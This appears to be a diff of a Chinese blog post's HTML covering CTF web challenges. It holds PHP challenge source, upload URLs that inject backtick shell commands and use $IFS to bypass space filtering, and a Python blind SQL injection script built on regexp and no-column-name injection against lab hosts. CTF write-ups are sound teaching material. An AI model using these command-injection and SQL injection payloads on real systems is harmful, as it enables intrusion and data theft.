<span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
 
@@ -59,11 +288,11 @@
 <p>反引号执行命令，空格被过滤，使用<code>$IFS</code>绕过，也可以用<code>%09</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\$IFS\$9&#x2F;&#96;?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.hualigs.cn/image/607984ad4ca06.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984ad4ca06.jpg" srcset="/img/loading.gif" lazyload></p>
 <p>读取flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\$IFS\$9\&#96;echo\$IFS\$9LyF3aGF0eW91d2FudGdnZ2dnZ2c0MDEucGhw|base64\$IFS\$9-d\&#96;&#96;?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.hualigs.cn/image/607984ad5bb46.jpg"></p>
+<p><img src="https://www.hualigs.cn/image/607984ad5bb46.jpg" srcset="/img/loading.gif" lazyload></p>
 <h1 id="happsql"><a href="#happsql" class="headerlink" title="happsql"></a>happsql</h1><p>布尔盲注。可以使用<code>regexp盲注</code>和<code>exp报错盲注</code>，后面还需要用到无列名注入的知识。</p>
 <p>regexp盲注，由于^被过滤，所以需要使用十六进制编码绕过，题目中过滤了information_schema，需要先读取mysql.innodb_table_stats来获得表名然后再进行无列名注入。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;-,.&quot;</span>:</span><br><span class="line">    <span class="comment"># for i in string.printable:</span></span><br><span class="line">        url = <span class="string">&quot;http://eci-2ze6jljai3r428c1jf6q.cloudeci1.ichunqiu.com/login.php&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com/index.php&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;cache-control&#x27;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;Postman-Token&#x27;</span>: <span class="string">&quot;21b59b79-a818-4fd1-a908-3112b45f9fc6&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 10.</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/version())/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;, &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        <span class="comment"># ctf,f1ag,</span></span><br><span class="line">        <span class="comment"># response = requests.request(&quot;POST&quot;, url, data=&#123;</span></span><br><span class="line">        <span class="comment">#     &#x27;username&#x27;: &#x27;admin&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x&#x27; + binascii.hexlify(</span></span><br><span class="line">        <span class="comment">#         (&quot;^&quot; + result + i).encode()).decode() + &#x27;#&#x27;,</span></span><br><span class="line">        <span class="comment">#     &#x27;password&#x27;: &#x27;123456&#x27;&#125;, headers=headers)</span></span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x&#x27;</span> + binascii.hexlify((<span class="string">&quot;^&quot;</span> + result + i).encode()).decode() + <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line">                                                       <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;, headers=headers)</span><br><span class="line">        print(response.text)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;home&quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
@@ -76,51 +305,200 @@
 
 
 <p>参考：</p>
-<p><a target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/48/">http://www.yang99.top/index.php/archives/48/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6859.html">https://www.zhaoj.in/read-6859.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg">https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg</a></p>
-</div><div class="article-licensing box"><div class="licensing-title"><p>2021红明谷ctf web部分复现</p><p><a href="http://example.com/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">http://example.com/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>John Doe</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-04-16</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-04-16</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">JNDI注入</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/"><span class="level-item">thinkphp 5.1.x 反序列化漏洞分析.md</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">45</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-30T07:20:41.000Z">2021-05-30</time></p><p class="title"><a href="/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro-550反序列化漏洞分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-28T04:36:53.000Z">2021-05-28</time></p><p class="title"><a href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/">ESP定律和动态脱UPX壳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-23T06:38:50.000Z">2021-05-23</time></p><p class="title"><a href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/">Servlet学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-18T06:04:20.000Z">2021-05-18</time></p><p class="title"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">CISCN2021 web部分题解</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-14T10:17:39.000Z">2021-05-14</time></p><p class="title"><a href="/2021/05/14/MRCTF2020-EzpopRevenge/">MRCTF2020-EzpopRevenge</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "此网站使用Cookie来改善您的体验。",
-          dismiss: "知道了！",
-          allow: "允许使用Cookie",
-          deny: "拒绝",
-          link: "了解更多",
-          policy: "Cookie政策",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
-        });</script></body></html>
+<p><a href="http://www.yang99.top/index.php/archives/48/">http://www.yang99.top/index.php/archives/48/</a></p>
+<p><a href="https://www.zhaoj.in/read-6859.html">https://www.zhaoj.in/read-6859.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg">https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/17/JNDI%E6%B3%A8%E5%85%A5/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JNDI注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/">
+                        <span class="hidden-mobile">thinkphp 5.1.x 反序列化漏洞分析.md</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
